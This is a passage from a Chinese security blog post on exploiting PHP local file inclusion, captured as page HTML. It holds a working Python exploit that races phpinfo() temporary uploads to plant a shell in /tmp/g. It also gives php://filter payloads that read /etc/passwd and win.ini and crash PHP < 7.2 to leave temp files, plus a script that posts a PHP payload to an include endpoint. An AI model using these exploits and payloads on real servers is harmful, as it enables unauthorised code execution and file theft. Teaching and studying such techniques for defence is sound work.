class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD</span><br><span class="line">    padding=&quot;A&quot; * 5000</span><br><span class="line">    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r</span><br><span class="line">HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    #modify this to suit the LFI script   </span><br><span class="line">    LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="line">User-Agent: Mozilla/4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(4096)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) != -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter &gt;= self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+=1</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break                </span><br><span class="line">                if x:</span><br><span class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i        </span><br><span class="line">        if i == &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">    if i == -1:</span><br><span class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</span><br><span class="line">    </span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    print &quot;LFI With PHPInfo()&quot;</span><br><span class="line">    print &quot;-=&quot; * 30</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    port=80</span><br><span class="line">    try:</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    poolsz=10</span><br><span class="line">    try:</span><br><span class="line">        poolsz = int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print &quot;Getting initial offset...&quot;,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = 1000</span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter &gt;= maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print &quot;Woot!  \m/&quot;</span><br><span class="line">        else:</span><br><span class="line">            print &quot;:(&quot;</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\nTelling threads to shutdown...&quot;</span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    print &quot;Shuttin&#x27; down...&quot;</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>创建成功在/tmp/g文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106191140143.png" alt="image-20211106191140143"></p>
+<p>通过请求尝试执行phpinfo()</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106193045025.png" alt="image-20211106193045025"></p>
+<h4 id="②PHP版本-lt-7-2，利用php崩溃留下临时文件"><a href="#②PHP版本-lt-7-2，利用php崩溃留下临时文件" class="headerlink" title="②PHP版本&lt;7.2，利用php崩溃留下临时文件"></a>②PHP版本&lt;7.2，利用php崩溃留下临时文件</h4><p>php7 segment fault特性</p>
+<p>​    段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了<strong>tmp目录</strong><br>     向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+<p>php &lt; 7.2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">php://filter/string.strip_tags/resource=C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<p>php7 老版本通杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PY代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">payload = &quot;&lt;?php phpinfo()?&gt;&quot;</span><br><span class="line">file_data = &#123;</span><br><span class="line">    &#x27;file&#x27;: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url = &quot;http://127.0.0.1/include.php?&quot;\</span><br><span class="line">      +&quot;filename=php://filter/string.strip_tags/resource=C:/Windows/win.ini&quot;</span><br><span class="line">r = requests.post(url=url, files=file_data, allow_redirects=False)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106200857922.png" alt="image-20211106200857922"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106201001030.png" alt="image-20211106201001030"></p>
+<p>成功利用上包含了该临时文件</p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年04月01日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月15日 - 15时44分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含利用思路">https://mrfan6.github.io/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ICMP隧道模式使用</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">文件包含利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">一、利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">二、实现方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%8C%85%E5%90%AB%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">1、包含一些敏感的配置文件;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Linux</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%85%8D%E5%90%88%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">2、配合图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E9%85%8D%E5%90%88PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">3、配合PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">各协议的利用条件和用法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php-input"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-filter"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data"><span class="toc-number">1.3.3.1.3.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E9%85%8D%E5%90%88%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.</span> <span class="toc-text">4、配合日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E9%85%8D%E5%90%88session%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.5.</span> <span class="toc-text">5、配合session文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.6.</span> <span class="toc-text">6、利用临时文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%A9%E7%94%A8%E8%83%BD%E8%AE%BF%E9%97%AE%E7%9A%84phpinfo%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%AF%B9%E5%85%B6%E4%B8%80%E6%AC%A1%E5%8F%91%E9%80%81%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE%E9%80%A0%E6%88%90%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%B2%A1%E6%9C%89%E5%8F%8A%E6%97%B6%E8%A2%AB%E5%88%A0%E9%99%A4"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">① 利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1PHP%E7%89%88%E6%9C%AC-lt-7-2%EF%BC%8C%E5%88%A9%E7%94%A8php%E5%B4%A9%E6%BA%83%E7%95%99%E4%B8%8B%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">②PHP版本&lt;7.2，利用php崩溃留下临时文件</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/" title="下一篇: ICMP隧道模式使用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">ICMP隧道模式使用</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
